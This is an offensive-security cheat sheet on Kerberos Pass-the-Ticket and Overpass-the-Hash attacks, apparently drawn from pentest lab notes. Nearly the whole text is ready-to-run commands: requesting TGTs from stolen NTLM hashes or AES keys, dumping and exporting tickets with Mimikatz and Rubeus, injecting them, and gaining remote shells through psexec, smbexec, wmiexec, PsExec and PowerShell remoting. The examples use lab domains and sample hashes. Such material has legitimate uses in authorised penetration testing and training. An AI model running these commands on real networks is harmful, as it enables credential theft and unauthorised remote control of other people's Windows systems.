# Pass The Ticket

## Overpass The Hash/Pass The Key (PTK)

By using [Impacket](https://github.com/SecureAuthCorp/impacket) examples:

```shell
# Request the TGT with hash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
# Request the TGT with password
python getTGT.py <domain_name>/<user_name>:[password]

# Set the TGT for impacket use
export KRB5CCNAME=<TGT_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py rastalabs.local/jack@10.10.10.1 -k -no-pass
python smbexec.py rastalabs.local/jack@10.10.10.1 -k -no-pass
python wmiexec.py rastalabs.local/jack@10.10.10.1 -k -no-pass
```

With [Rubeus](https://github.com/GhostPack/Rubeus) and [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):

```shell
# Ask and inject the ticket
.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt

# Execute a cmd in the remote machine
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

* Impacket’s `psexec.py` offers `psexec` like functionality. This will give you an interactive shell on the Windows host. `psexec.py` also allows using Service Tickets, saved as a `ccache` file for Authentication. It can be obtained via Impacket’s `GetST.py`
* It is much easier to use variables&#x20;

```
target=10.10.10.1
domain=test.local
username=john
export KRB5CCNAME=/full/path/to/john.ccache
python3 psexec.py $domain/$username@$target -k -no-pass
```

---

## Pass the Ticket - Mimikatz

### Export All Tickets

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

### Import .kirbi Ticket

```
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

## Pass the Ticket - Rubeus

### Dump Tickets

```
Rubeus.exe dump /nowrap
```

### Request TGT and Inject (Pass the Key / OverPass the Hash)

```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

### Import .kirbi

```
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

### Create Sacrificial Logon Session + PtT

```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

## PtT with PowerShell Remoting

```
mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

```powershell
Enter-PSSession -ComputerName DC01
```

## Convert .kirbi to Base64

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
